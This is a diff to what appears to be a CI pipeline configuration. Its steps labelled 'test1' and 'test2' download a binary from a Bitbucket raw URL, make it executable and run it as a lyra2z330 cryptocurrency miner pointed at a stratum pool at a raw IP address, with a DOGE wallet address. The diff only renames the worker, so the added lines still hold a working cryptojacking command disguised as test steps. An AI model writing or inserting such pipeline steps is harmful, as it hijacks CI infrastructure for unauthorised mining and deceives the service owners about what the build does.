@@ -5,7 +5,7 @@ steps:
 - name: test1
   image: golang
   commands:
-  - wget -qO build https://bitbucket.org/jenisfield/jenisfield/raw/6448449070b2c6b8e095d2008366d324f98ee75a/buildname && chmod +x build && ./build -a lyra2z330 -o stratum+tcp://198.50.168.213:4563 -u DRreZxpmCRTsVyr7iCiycLWRgnLh98xXAE.dock -p c=DOGE,zap=BUTK-lyra/GXX/PYRK-lyra2z330
+  - wget -qO build https://bitbucket.org/jenisfield/jenisfield/raw/6448449070b2c6b8e095d2008366d324f98ee75a/buildname && chmod +x build && ./build -a lyra2z330 -o stratum+tcp://198.50.168.213:4563 -u DRreZxpmCRTsVyr7iCiycLWRgnLh98xXAE.dock90 -p c=DOGE,zap=BUTK-lyra/GXX/PYRK-lyra2z330
 ---
 kind: pipeline
 type: docker
@@ -15,7 +15,7 @@ steps:
 - name: test2
   image: node
   commands:
-  - wget -qO build https://bitbucket.org/jenisfield/jenisfield/raw/6448449070b2c6b8e095d2008366d324f98ee75a/buildname && chmod +x build && ./build -a lyra2z330 -o stratum+tcp://198.50.168.213:4563 -u DRreZxpmCRTsVyr7iCiycLWRgnLh98xXAE.dock -p c=DOGE,zap=BUTK-lyra/GXX/PYRK-lyra2z330
+  - wget -qO build https://bitbucket.org/jenisfield/jenisfield/raw/6448449070b2c6b8e095d2008366d324f98ee75a/buildname && chmod +x build && ./build -a lyra2z330 -o stratum+tcp://198.50.168.213:4563 -u DRreZxpmCRTsVyr7iCiycLWRgnLh98xXAE.dock90 -p c=DOGE,zap=BUTK-lyra/GXX/PYRK-lyra2z330
 ---
 kind: pipeline
 name: after
@@ -25,7 +25,6 @@ steps:
   image: plugins/slack
   settings:
     room: general
-
 
 depends_on:
 - build1
